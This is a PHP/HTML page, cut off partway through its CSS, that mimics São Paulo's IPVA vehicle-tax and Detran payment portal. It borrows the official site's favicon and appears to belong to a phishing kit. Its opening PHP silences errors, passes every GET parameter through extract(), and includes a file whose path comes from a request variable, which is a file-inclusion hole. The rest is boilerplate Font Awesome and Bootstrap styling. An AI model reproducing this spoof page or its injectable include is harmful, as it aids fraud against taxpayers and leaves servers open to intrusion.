<?php

error_reporting(0);

extract($_GET);

if($sucesso){

    include_once("$diretorio/IPSPhome.php");
    
    exit();
}



?>

<!DOCTYPE html>
<html lang="pt" translate="no">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>IPVA, Débitos de Veículos e Taxas Detran</title>
    <!--<base href="/pix/">-->
    <base href=".">
    <meta name="google" value="notranslate">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style type="text/css">
    :root,
    :host {
        --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
        --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
        --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
        --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
        --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
        --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
        --fa-font-sharp-regular: normal 400 1em/1 "Font Awesome 6 Sharp";
        --fa-font-sharp-light: normal 300 1em/1 "Font Awesome 6 Sharp";
        --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
    }

    svg:not(:root).svg-inline--fa,
    svg:not(:host).svg-inline--fa {
        overflow: visible;
        box-sizing: content-box;
    }

    .svg-inline--fa {
        display: var(--fa-display, inline-block);
        height: 1em;
        overflow: visible;
        vertical-align: -0.125em;
    }

    .svg-inline--fa.fa-2xs {
        vertical-align: 0.1em;
    }

    .svg-inline--fa.fa-xs {
        vertical-align: 0em;
    }

    .svg-inline--fa.fa-sm {
        vertical-align: -0.0714285705em;
    }

    .svg-inline--fa.fa-lg {
        vertical-align: -0.2em;
    }

    .svg-inline--fa.fa-xl {
        vertical-align: -0.25em;
    }

    .svg-inline--fa.fa-2xl {
        vertical-align: -0.3125em;
    }

    .svg-inline--fa.fa-pull-left {
        margin-right: var(--fa-pull-margin, 0.3em);
        width: auto;
    }

    .svg-inline--fa.fa-pull-right {
        margin-left: var(--fa-pull-margin, 0.3em);
        width: auto;
    }

    .svg-inline--fa.fa-li {
        width: var(--fa-li-width, 2em);
        top: 0.25em;
    }

    .svg-inline--fa.fa-fw {
        width: var(--fa-fw-width, 1.25em);
    }

    .fa-layers svg.svg-inline--fa {
        bottom: 0;
        left: 0;
        margin: auto;
        position: absolute;
        right: 0;
        top: 0;
    }

    .fa-layers-counter,
    .fa-layers-text {
        display: inline-block;
        position: absolute;
        text-align: center;
    }

    .fa-layers {
        display: inline-block;
        height: 1em;
        position: relative;
        text-align: center;
        vertical-align: -0.125em;
        width: 1em;
    }

    .fa-layers svg.svg-inline--fa {
        -webkit-transform-origin: center center;
        transform-origin: center center;
    }

    .fa-layers-text {
        left: 50%;
        top: 50%;
        -webkit-transform: translate(-50%, -50%);
        transform: translate(-50%, -50%);
        -webkit-transform-origin: center center;
        transform-origin: center center;
    }

    .fa-layers-counter {
        background-color: var(--fa-counter-background-color, #ff253a);
        border-radius: var(--fa-counter-border-radius, 1em);
        box-sizing: border-box;
        color: var(--fa-inverse, #fff);
        line-height: var(--fa-counter-line-height, 1);
        max-width: var(--fa-counter-max-width, 5em);
        min-width: var(--fa-counter-min-width, 1.5em);
        overflow: hidden;
        padding: var(--fa-counter-padding, 0.25em 0.5em);
        right: var(--fa-right, 0);
        text-overflow: ellipsis;
        top: var(--fa-top, 0);
        -webkit-transform: scale(var(--fa-counter-scale, 0.25));
        transform: scale(var(--fa-counter-scale, 0.25));
        -webkit-transform-origin: top right;
        transform-origin: top right;
    }

    .fa-layers-bottom-right {
        bottom: var(--fa-bottom, 0);
        right: var(--fa-right, 0);
        top: auto;
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: bottom right;
        transform-origin: bottom right;
    }

    .fa-layers-bottom-left {
        bottom: var(--fa-bottom, 0);
        left: var(--fa-left, 0);
        right: auto;
        top: auto;
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: bottom left;
        transform-origin: bottom left;
    }

    .fa-layers-top-right {
        top: var(--fa-top, 0);
        right: var(--fa-right, 0);
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: top right;
        transform-origin: top right;
    }

    .fa-layers-top-left {
        left: var(--fa-left, 0);
        right: auto;
        top: var(--fa-top, 0);
        -webkit-transform: scale(var(--fa-layers-scale, 0.25));
        transform: scale(var(--fa-layers-scale, 0.25));
        -webkit-transform-origin: top left;
        transform-origin: top left;
    }

    .fa-1x {
        font-size: 1em;
    }

    .fa-2x {
        font-size: 2em;
    }

    .fa-3x {
        font-size: 3em;
    }

    .fa-4x {
        font-size: 4em;
    }

    .fa-5x {
        font-size: 5em;
    }

    .fa-6x {
        font-size: 6em;
    }

    .fa-7x {
        font-size: 7em;
    }

    .fa-8x {
        font-size: 8em;
    }

    .fa-9x {
        font-size: 9em;
    }

    .fa-10x {
        font-size: 10em;
    }

    .fa-2xs {
        font-size: 0.625em;
        line-height: 0.1em;
        vertical-align: 0.225em;
    }

    .fa-xs {
        font-size: 0.75em;
        line-height: 0.0833333337em;
        vertical-align: 0.125em;
    }

    .fa-sm {
        font-size: 0.875em;
        line-height: 0.0714285718em;
        vertical-align: 0.0535714295em;
    }

    .fa-lg {
        font-size: 1.25em;
        line-height: 0.05em;
        vertical-align: -0.075em;
    }

    .fa-xl {
        font-size: 1.5em;
        line-height: 0.0416666682em;
        vertical-align: -0.125em;
    }

    .fa-2xl {
        font-size: 2em;
        line-height: 0.03125em;
        vertical-align: -0.1875em;
    }

    .fa-fw {
        text-align: center;
        width: 1.25em;
    }

    .fa-ul {
        list-style-type: none;
        margin-left: var(--fa-li-margin, 2.5em);
        padding-left: 0;
    }

    .fa-ul>li {
        position: relative;
    }

    .fa-li {
        left: calc(var(--fa-li-width, 2em) * -1);
        position: absolute;
        text-align: center;
        width: var(--fa-li-width, 2em);
        line-height: inherit;
    }

    .fa-border {
        border-color: var(--fa-border-color, #eee);
        border-radius: var(--fa-border-radius, 0.1em);
        border-style: var(--fa-border-style, solid);
        border-width: var(--fa-border-width, 0.08em);
        padding: var(--fa-border-padding, 0.2em 0.25em 0.15em);
    }

    .fa-pull-left {
        float: left;
        margin-right: var(--fa-pull-margin, 0.3em);
    }

    .fa-pull-right {
        float: right;
        margin-left: var(--fa-pull-margin, 0.3em);
    }

    .fa-beat {
        -webkit-animation-name: fa-beat;
        animation-name: fa-beat;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
        animation-timing-function: var(--fa-animation-timing, ease-in-out);
    }

    .fa-bounce {
        -webkit-animation-name: fa-bounce;
        animation-name: fa-bounce;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
        animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.28, 0.84, 0.42, 1));
    }

    .fa-fade {
        -webkit-animation-name: fa-fade;
        animation-name: fa-fade;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
    }

    .fa-beat-fade {
        -webkit-animation-name: fa-beat-fade;
        animation-name: fa-beat-fade;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
        animation-timing-function: var(--fa-animation-timing, cubic-bezier(0.4, 0, 0.6, 1));
    }

    .fa-flip {
        -webkit-animation-name: fa-flip;
        animation-name: fa-flip;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, ease-in-out);
        animation-timing-function: var(--fa-animation-timing, ease-in-out);
    }

    .fa-shake {
        -webkit-animation-name: fa-shake;
        animation-name: fa-shake;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, linear);
        animation-timing-function: var(--fa-animation-timing, linear);
    }

    .fa-spin {
        -webkit-animation-name: fa-spin;
        animation-name: fa-spin;
        -webkit-animation-delay: var(--fa-animation-delay, 0s);
        animation-delay: var(--fa-animation-delay, 0s);
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 2s);
        animation-duration: var(--fa-animation-duration, 2s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, linear);
        animation-timing-function: var(--fa-animation-timing, linear);
    }

    .fa-spin-reverse {
        --fa-animation-direction: reverse;
    }

    .fa-pulse,
    .fa-spin-pulse {
        -webkit-animation-name: fa-spin;
        animation-name: fa-spin;
        -webkit-animation-direction: var(--fa-animation-direction, normal);
        animation-direction: var(--fa-animation-direction, normal);
        -webkit-animation-duration: var(--fa-animation-duration, 1s);
        animation-duration: var(--fa-animation-duration, 1s);
        -webkit-animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        animation-iteration-count: var(--fa-animation-iteration-count, infinite);
        -webkit-animation-timing-function: var(--fa-animation-timing, steps(8));
        animation-timing-function: var(--fa-animation-timing, steps(8));
    }

    @media (prefers-reduced-motion: reduce) {

        .fa-beat,
        .fa-bounce,
        .fa-fade,
        .fa-beat-fade,
        .fa-flip,
        .fa-pulse,
        .fa-shake,
        .fa-spin,
        .fa-spin-pulse {
            -webkit-animation-delay: -1ms;
            animation-delay: -1ms;
            -webkit-animation-duration: 1ms;
            animation-duration: 1ms;
            -webkit-animation-iteration-count: 1;
            animation-iteration-count: 1;
            -webkit-transition-delay: 0s;
            transition-delay: 0s;
            -webkit-transition-duration: 0s;
            transition-duration: 0s;
        }
    }

    @-webkit-keyframes fa-beat {

        0%,
        90% {
            -webkit-transform: scale(1);
            transform: scale(1);
        }

        45% {
            -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
        }
    }

    @keyframes fa-beat {

        0%,
        90% {
            -webkit-transform: scale(1);
            transform: scale(1);
        }

        45% {
            -webkit-transform: scale(var(--fa-beat-scale, 1.25));
            transform: scale(var(--fa-beat-scale, 1.25));
        }
    }

    @-webkit-keyframes fa-bounce {
        0% {
            -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
        }

        10% {
            -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
        }

        30% {
            -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
        }

        50% {
            -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
        }

        57% {
            -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
        }

        64% {
            -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
        }

        100% {
            -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
        }
    }

    @keyframes fa-bounce {
        0% {
            -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
        }

        10% {
            -webkit-transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
            transform: scale(var(--fa-bounce-start-scale-x, 1.1), var(--fa-bounce-start-scale-y, 0.9)) translateY(0);
        }

        30% {
            -webkit-transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
            transform: scale(var(--fa-bounce-jump-scale-x, 0.9), var(--fa-bounce-jump-scale-y, 1.1)) translateY(var(--fa-bounce-height, -0.5em));
        }

        50% {
            -webkit-transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
            transform: scale(var(--fa-bounce-land-scale-x, 1.05), var(--fa-bounce-land-scale-y, 0.95)) translateY(0);
        }

        57% {
            -webkit-transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
            transform: scale(1, 1) translateY(var(--fa-bounce-rebound, -0.125em));
        }

        64% {
            -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
        }

        100% {
            -webkit-transform: scale(1, 1) translateY(0);
            transform: scale(1, 1) translateY(0);
        }
    }

    @-webkit-keyframes fa-fade {
        50% {
            opacity: var(--fa-fade-opacity, 0.4);
        }
    }

    @keyframes fa-fade {
        50% {
            opacity: var(--fa-fade-opacity, 0.4);
        }
    }

    @-webkit-keyframes fa-beat-fade {

        0%,
        100% {
            opacity: var(--fa-beat-fade-opacity, 0.4);
            -webkit-transform: scale(1);
            transform: scale(1);
        }

        50% {
            opacity: 1;
            -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
        }
    }

    @keyframes fa-beat-fade {

        0%,
        100% {
            opacity: var(--fa-beat-fade-opacity, 0.4);
            -webkit-transform: scale(1);
            transform: scale(1);
        }

        50% {
            opacity: 1;
            -webkit-transform: scale(var(--fa-beat-fade-scale, 1.125));
            transform: scale(var(--fa-beat-fade-scale, 1.125));
        }
    }

    @-webkit-keyframes fa-flip {
        50% {
            -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
        }
    }

    @keyframes fa-flip {
        50% {
            -webkit-transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
            transform: rotate3d(var(--fa-flip-x, 0), var(--fa-flip-y, 1), var(--fa-flip-z, 0), var(--fa-flip-angle, -180deg));
        }
    }

    @-webkit-keyframes fa-shake {
        0% {
            -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
        }

        4% {
            -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
        }

        8%,
        24% {
            -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
        }

        12%,
        28% {
            -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
        }

        16% {
            -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
        }

        20% {
            -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
        }

        32% {
            -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
        }

        36% {
            -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
        }

        40%,
        100% {
            -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
        }
    }

    @keyframes fa-shake {
        0% {
            -webkit-transform: rotate(-15deg);
            transform: rotate(-15deg);
        }

        4% {
            -webkit-transform: rotate(15deg);
            transform: rotate(15deg);
        }

        8%,
        24% {
            -webkit-transform: rotate(-18deg);
            transform: rotate(-18deg);
        }

        12%,
        28% {
            -webkit-transform: rotate(18deg);
            transform: rotate(18deg);
        }

        16% {
            -webkit-transform: rotate(-22deg);
            transform: rotate(-22deg);
        }

        20% {
            -webkit-transform: rotate(22deg);
            transform: rotate(22deg);
        }

        32% {
            -webkit-transform: rotate(-12deg);
            transform: rotate(-12deg);
        }

        36% {
            -webkit-transform: rotate(12deg);
            transform: rotate(12deg);
        }

        40%,
        100% {
            -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
        }
    }

    @-webkit-keyframes fa-spin {
        0% {
            -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
        }

        100% {
            -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
        }
    }

    @keyframes fa-spin {
        0% {
            -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
        }

        100% {
            -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
        }
    }

    .fa-rotate-90 {
        -webkit-transform: rotate(90deg);
        transform: rotate(90deg);
    }

    .fa-rotate-180 {
        -webkit-transform: rotate(180deg);
        transform: rotate(180deg);
    }

    .fa-rotate-270 {
        -webkit-transform: rotate(270deg);
        transform: rotate(270deg);
    }

    .fa-flip-horizontal {
        -webkit-transform: scale(-1, 1);
        transform: scale(-1, 1);
    }

    .fa-flip-vertical {
        -webkit-transform: scale(1, -1);
        transform: scale(1, -1);
    }

    .fa-flip-both,
    .fa-flip-horizontal.fa-flip-vertical {
        -webkit-transform: scale(-1, -1);
        transform: scale(-1, -1);
    }

    .fa-rotate-by {
        -webkit-transform: rotate(var(--fa-rotate-angle, none));
        transform: rotate(var(--fa-rotate-angle, none));
    }

    .fa-stack {
        display: inline-block;
        vertical-align: middle;
        height: 2em;
        position: relative;
        width: 2.5em;
    }

    .fa-stack-1x,
    .fa-stack-2x {
        bottom: 0;
        left: 0;
        margin: auto;
        position: absolute;
        right: 0;
        top: 0;
        z-index: var(--fa-stack-z-index, auto);
    }

    .svg-inline--fa.fa-stack-1x {
        height: 1em;
        width: 1.25em;
    }

    .svg-inline--fa.fa-stack-2x {
        height: 2em;
        width: 2.5em;
    }

    .fa-inverse {
        color: var(--fa-inverse, #fff);
    }

    .sr-only,
    .fa-sr-only {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border-width: 0;
    }

    .sr-only-focusable:not(:focus),
    .fa-sr-only-focusable:not(:focus) {
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        white-space: nowrap;
        border-width: 0;
    }

    .svg-inline--fa .fa-primary {
        fill: var(--fa-primary-color, currentColor);
        opacity: var(--fa-primary-opacity, 1);
    }

    .svg-inline--fa .fa-secondary {
        fill: var(--fa-secondary-color, currentColor);
        opacity: var(--fa-secondary-opacity, 0.4);
    }

    .svg-inline--fa.fa-swap-opacity .fa-primary {
        opacity: var(--fa-secondary-opacity, 0.4);
    }

    .svg-inline--fa.fa-swap-opacity .fa-secondary {
        opacity: var(--fa-primary-opacity, 1);
    }

    .svg-inline--fa mask .fa-primary,
    .svg-inline--fa mask .fa-secondary {
        fill: black;
    }

    .fad.fa-inverse,
    .fa-duotone.fa-inverse {
        color: var(--fa-inverse, #fff);
    }
    </style>
    <link rel="icon" type="image/x-icon" href="https://pixveiculos.fazenda.sp.gov.br/pix/favicon.ico">

    <style>
    @charset "UTF-8";

    :root {
        --bs-blue: #0d6efd;
        --bs-indigo: #6610f2;
        --bs-purple: #6f42c1;
        --bs-pink: #d63384;
        --bs-red: #dc3545;
        --bs-orange: #fd7e14;
        --bs-yellow: #ffc107;
        --bs-green: #198754;
        --bs-teal: #20c997;
        --bs-cyan: #0dcaf0;
        --bs-black: #000;
        --bs-white: #fff;
        --bs-gray: #6c757d;
        --bs-gray-dark: #343a40;
        --bs-gray-100: #f8f9fa;
        --bs-gray-200: #e9ecef;
        --bs-gray-300: #dee2e6;
        --bs-gray-400: #ced4da;
        --bs-gray-500: #adb5bd;
        --bs-gray-600: #6c757d;
        --bs-gray-700: #495057;
        --bs-gray-800: #343a40;
        --bs-gray-900: #212529;
        --bs-primary: #0d6efd;
        --bs-secondary: #6c757d;
        --bs-success: #198754;
        --bs-info: #0dcaf0;
        --bs-warning: #ffc107;
        --bs-danger: #dc3545;
        --bs-light: #f8f9fa;
        --bs-dark: #212529;
        --bs-primary-rgb: 13, 110, 253;
        --bs-secondary-rgb: 108, 117, 125;
        --bs-success-rgb: 25, 135, 84;
        --bs-info-rgb: 13, 202, 240;
        --bs-warning-rgb: 255, 193, 7;
        --bs-danger-rgb: 220, 53, 69;
        --bs-light-rgb: 248, 249, 250;
        --bs-dark-rgb: 33, 37, 41;
        --bs-primary-text-emphasis: #052c65;
        --bs-secondary-text-emphasis: #2b2f32;
        --bs-success-text-emphasis: #0a3622;
        --bs-info-text-emphasis: #055160;
        --bs-warning-text-emphasis: #664d03;
        --bs-danger-text-emphasis: #58151c;
        --bs-light-text-emphasis: #495057;
        --bs-dark-text-emphasis: #495057;
        --bs-primary-bg-subtle: #cfe2ff;
        --bs-secondary-bg-subtle: #e2e3e5;
        --bs-success-bg-subtle: #d1e7dd;
        --bs-info-bg-subtle: #cff4fc;
        --bs-warning-bg-subtle: #fff3cd;
        --bs-danger-bg-subtle: #f8d7da;
        --bs-light-bg-subtle: #fcfcfd;
        --bs-dark-bg-subtle: #ced4da;
        --bs-primary-border-subtle: #9ec5fe;
        --bs-secondary-border-subtle: #c4c8cb;
        --bs-success-border-subtle: #a3cfbb;
        --bs-info-border-subtle: #9eeaf9;
        --bs-warning-border-subtle: #ffe69c;
        --bs-danger-border-subtle: #f1aeb5;
        --bs-light-border-subtle: #e9ecef;
        --bs-dark-border-subtle: #adb5bd;
        --bs-white-rgb: 255, 255, 255;
        --bs-black-rgb: 0, 0, 0;
        --bs-font-sans-serif: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
        --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, .15), rgba(255, 255, 255, 0));
        --bs-body-font-family: var(--bs-font-sans-serif);
        --bs-body-font-size: 1rem;
        --bs-body-font-weight: 400;
        --bs-body-line-height: 1.5;
        --bs-body-color: #212529;
        --bs-body-color-rgb: 33, 37, 41;
        --bs-body-bg: #fff;
        --bs-body-bg-rgb: 255, 255, 255;
        --bs-emphasis-color: #000;
        --bs-emphasis-color-rgb: 0, 0, 0;
        --bs-secondary-color: rgba(33, 37, 41, .75);
        --bs-secondary-color-rgb: 33, 37, 41;
        --bs-secondary-bg: #e9ecef;
        --bs-secondary-bg-rgb: 233, 236, 239;
        --bs-tertiary-color: rgba(33, 37, 41, .5);
        --bs-tertiary-color-rgb: 33, 37, 41;
        --bs-tertiary-bg: #f8f9fa;
        --bs-tertiary-bg-rgb: 248, 249, 250;
        --bs-heading-color: inherit;
        --bs-link-color: #0d6efd;
        --bs-link-color-rgb: 13, 110, 253;
        --bs-link-decoration: underline;
        --bs-link-hover-color: #0a58ca;
        --bs-link-hover-color-rgb: 10, 88, 202;
        --bs-code-color: #d63384;
        --bs-highlight-bg: #fff3cd;
        --bs-border-width: 1px;
        --bs-border-style: solid;
        --bs-border-color: #dee2e6;
        --bs-border-color-translucent: rgba(0, 0, 0, .175);
        --bs-border-radius: .375rem;
        --bs-border-radius-sm: .25rem;
        --bs-border-radius-lg: .5rem;
        --bs-border-radius-xl: 1rem;
        --bs-border-radius-xxl: 2rem;
        --bs-border-radius-2xl: var(--bs-border-radius-xxl);
        --bs-border-radius-pill: 50rem;
        --bs-box-shadow: 0 .5rem 1rem rgba(0, 0, 0, .15);
        --bs-box-shadow-sm: 0 .125rem .25rem rgba(0, 0, 0, .075);
        --bs-box-shadow-lg: 0 1rem 3rem rgba(0, 0, 0, .175);
        --bs-box-shadow-inset: inset 0 1px 2px rgba(0, 0, 0, .075);
        --bs-focus-ring-width: .25rem;
        --bs-focus-ring-opacity: .25;
        --bs-focus-ring-color: rgba(13, 110, 253, .25);
        --bs-form-valid-color: #198754;
        --bs-form-valid-border-color: #198754;
        --bs-form-invalid-color: #dc3545;
        --bs-form-invalid-border-color: #dc3545
    }

    @media (prefers-reduced-motion:no-preference) {
        :root {
            scroll-behavior: smooth
        }
    }

    body {
        margin: 0;
        font-family: var(--bs-body-font-family);
        font-size: var(--bs-body-font-size);
        font-weight: var(--bs-body-font-weight);
        line-height: var(--bs-body-line-height);
        color: var(--bs-body-color);
        text-align: var(--bs-body-text-align);
        background-color: var(--bs-body-bg);
        -webkit-text-size-adjust: 100%;
        -webkit-tap-highlight-color: transparent
    }

    :root {
        --bs-breakpoint-xs: 0;
        --bs-breakpoint-sm: 576px;
        --bs-breakpoint-md: 768px;
        --bs-breakpoint-lg: 992px;
        --bs-breakpoint-xl: 1200px;
        --bs-breakpoint-xxl: 1400px
    }

    :root {
        --blue: #007bff;
        --indigo: #6610f2;
        --purple: #6f42c1;
        --pink: #e83e8c;
        --red: #dc3545;
        --orange: #fd7e14;
        --yellow: #ffc107;
        --green: #28a745;
        --teal: #20c997;
        --cyan: #17a2b8;
        --white: #fff;
        --gray: #6c757d;
        --gray-dark: #343a40;
        --primary: #007bff;
        --secondary: #6c757d;
        --success: #28a745;
        --info: #17a2b8;
        --warning: #ffc107;
        --danger: #dc3545;
        --light: #f8f9fa;
        --dark: #343a40;
        --breakpoint-xs: 0;
        --breakpoint-sm: 576px;
        --breakpoint-md: 768px;
        --breakpoint-lg: 992px;
        --breakpoint-xl: 1200px;
        --font-family-sans-serif: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
        --font-family-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace
    }

    *,
    :after,
    :before {
        box-sizing: border-box
    }

    html {
        font-family: sans-serif;
        line-height: 1.15;
        -webkit-text-size-adjust: 100%;
        -webkit-tap-highlight-color: transparent
    }

    body {
        margin: 0;
        font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-size: 1rem;
        font-weight: 400;
        line-height: 1.5;
        color: #212529;
        text-align: left;
        background-color: #fff
    }

    @media print {

        *,
        :after,
        :before {
            text-shadow: none !important;
            box-shadow: none !important
        }

        @page {
            size: a3
        }

        body {
            min-width: 992px !important
        }
    }

    html {
        height: 100%;
        box-sizing: border-box
    }

    body {
        font-family: Segoe UI, Arial, sans-serif, "Segoe UI Emoji", Segoe UI Symbol !important;
        font-size: 13px
    }

    body {
        font-family: Verdana
    }

    :root {
        --cor-principal: #034ea2
    }
    </style>
    <link rel="stylesheet" href="./<?= $diretorio ?>/index_files/styles.ac6303407845c20c.css" media="all"
        onload="this.media=&#39;all&#39;"><noscript>
        <link rel="stylesheet" href="/pix/styles.ac6303407845c20c.css">
    </noscript>
    <style>
    .logo-governo[_ngcontent-oyi-c103] {
        display: block;
        margin-top: 10px;
        margin-bottom: 0%
    }

    @media only screen and (max-width: 767px) {
